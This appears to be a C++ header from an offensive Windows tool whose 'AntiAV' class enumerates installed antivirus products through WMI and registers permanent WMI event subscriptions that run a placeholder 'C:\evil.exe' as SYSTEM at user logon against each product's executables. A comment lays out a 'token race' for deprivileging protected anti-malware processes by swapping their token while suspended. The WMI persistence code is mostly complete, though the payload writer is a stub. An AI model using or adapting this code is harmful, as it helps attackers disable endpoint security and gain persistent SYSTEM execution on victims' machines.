#pragma once
#include "wmi.h"

// This class stores all of the AntiAV methods

// This is totally separate from the WMI stuff. Wrote it just for fun

class AntiAV
{
	BOOL IReady;
	
	AntiAV(COMWrapper& com_wrapper, WMIConnection& wmi_connection, QueryInterface& query_interface) :
		ICom(com_wrapper), WMI(wmi_connection), IQuery(query_interface), IReady(FALSE)
	{
		if (ICom.IReady && WMI.IReady)
		{
			HRESULT bAv = IQuery.QueryAntivirusProducts(vAVProducts);
			if(SUCCEEDED(bAv))
				IReady = TRUE;
		}
	}

public:

	/* Token Race:
	 
	 When a WMI command line consumer launches a process, it is run under the
	 SYSTEM account. The SYSTEM account has full control privileges over the
	 tokens of PPL Anti-Malware processes. 
	 
	 We cannot modify the token of a running process from user-land. However, we can
	 create a suspended process and swap it's token before it is resumed.
	 
	 So long as we start the process before svchost does, we can create the process
	 in a suspended state, switch it's token with a supremely deprivileged token using 
	 NtSetInformationProcess, and then resume the process. 
	 
	*/
	
	class TokenRace
	{
	public:
		BOOL IReady;
		
		TokenRace( COMWrapper& com_wrapper, WMIConnection& wmi_connection, QueryInterface& query_interface, AntiAV& antiav):
			ICom(com_wrapper), WMI(wmi_connection), IQuery(query_interface), parent(antiav), IReady(FALSE)
		{
			if (ICom.IReady && WMI.IReady)
				IReady = TRUE;
		}
		
		BOOL WritePayload()
		{
			// Write the payload to disk
			return TRUE;
		}

		BOOL CreateBinders()
		{
			HRESULT hres = NULL;
			
			for (auto& av : parent.vAVProducts)
			{
				// Definitions
				HRESULT hres = NULL;

				// Debug dump
				ILog("AV: %ls\n", av.displayName.c_str());
				ILog("  GUID:  %ls\n", av.instanceGuid.c_str());
				ILog("  State: %u\n", av.productState);
				std::cout << "State (hex): " << std::hex << av.productState << std::endl;
				ILog("  Path:  %ls\n", av.pathSignedExe.c_str());
				ILog("  Reporting: %ls\n", av.pathReportingExe.c_str());
				ILog("  Timestamp: %ls\n", av.timestamp.c_str());

				// Each AV product has two executables listed in the WMI. One for reporting, 
				// one for the service. We need to disable both of them

				// Reporting
				std::wstring sPathReporter = L"C:\\evil.exe " + av.pathSignedExe;
				std::wstring sReportConsumerName = remove_extension(base_name(av.pathReportingExe));
				std::wstring sReportFilterName = remove_extension(base_name(av.pathReportingExe));

				if (!sReportConsumerName.empty())
					sReportConsumerName += L"_Consumer";
				if (!sReportFilterName.empty())
					sReportFilterName += L"_Filter";
				
				BindingInterface IBindReport(ICom, WMI);

				if (IBindReport.IReady)
				{
					if (!sReportFilterName.empty() && !sReportConsumerName.empty())
						hres = S_OK;
					else
						hres = E_FAIL;
					
					if(SUCCEEDED(hres))
						hres = IBindReport.CreateFilter(sReportFilterName,
							L"SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE TargetInstance ISA 'Win32_LoggedOnUser'",
							L"root/cimv2");

					if (SUCCEEDED(hres))
						hres = IBindReport.CreateCommandLineConsumer(sReportConsumerName, sPathReporter, L"");


					if (SUCCEEDED(hres))
						hres = IBindReport.BindFilterAndConsumer();
				}

				// Signed service
				std::wstring sPathSigner = L"C:\\evil.exe " + av.pathReportingExe;
				std::wstring sSignConsumerName = remove_extension(base_name(av.pathSignedExe));
				std::wstring sSignFilterName = remove_extension(base_name(av.pathSignedExe));

				if (!sSignConsumerName.empty())
					sSignConsumerName += L"_Consumer";
				if (!sSignFilterName.empty())
					sSignFilterName += L"_Filter";
				
				BindingInterface IBindSign(ICom, WMI);

				// If the interfaces are ready, we continue
				if (IBindSign.IReady)
				{

					if (!sSignFilterName.empty() && !sSignConsumerName.empty())
						hres = S_OK;
					else
						hres = E_FAIL;
					
					// If either string is empty we skip
					// Otherwise we set the filter for each
					if (SUCCEEDED(hres))
						hres = IBindSign.CreateFilter(sSignFilterName,
							L"SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE TargetInstance ISA 'Win32_LoggedOnUser'",
							L"root/cimv2");
						
					// Create the consumers
					if (SUCCEEDED(hres))
						hres = IBindSign.CreateCommandLineConsumer(sSignConsumerName, sPathSigner, L"");

					// Bind the consumers to the filters
					if (SUCCEEDED(hres))
						hres = IBindSign.BindFilterAndConsumer();

				}

			}
			return TRUE;
		}

		private:
			COMWrapper& ICom;
			WMIConnection& WMI;
			QueryInterface& IQuery;
			AntiAV& parent;
			
	};
	


	private:
		COMWrapper& ICom;
		WMIConnection& WMI;
		QueryInterface& IQuery;
		AVProduct avProduct;
		std::vector<AVProduct> vAVProducts;
		
};
